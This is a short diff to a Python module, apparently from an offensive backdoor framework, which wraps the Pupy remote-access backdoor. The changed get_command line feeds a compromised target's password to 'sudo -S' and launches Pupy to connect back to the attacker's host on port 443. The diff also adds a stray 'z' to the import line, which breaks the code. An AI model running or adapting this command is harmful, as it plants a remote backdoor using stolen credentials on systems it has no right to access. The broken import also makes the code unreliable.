@@ -1,4 +1,4 @@
-from backdoors.backdoor import *
+zfrom backdoors.backdoor import *
 import os
 
 class Pupy(Backdoor):
@@ -16,7 +16,7 @@ class Pupy(Backdoor):
         self.help_text = INFO + "Uses n1nj4sec's Pupy backdoor." 
 
     def get_command(self):
-        return "echo " + self.core.curtarget.pword + " | sudo -S python ~/pupy/pp.py simple --host " + self.core.localIP + ":443"
+        return "echo " + self.core.curtarget.pword + " | sudo -S python ~/pupy/pupy/pp.py simple --host " + self.core.localIP + ":443"
 
     def do_exploit(self, args):
         port = self.get_value("port")
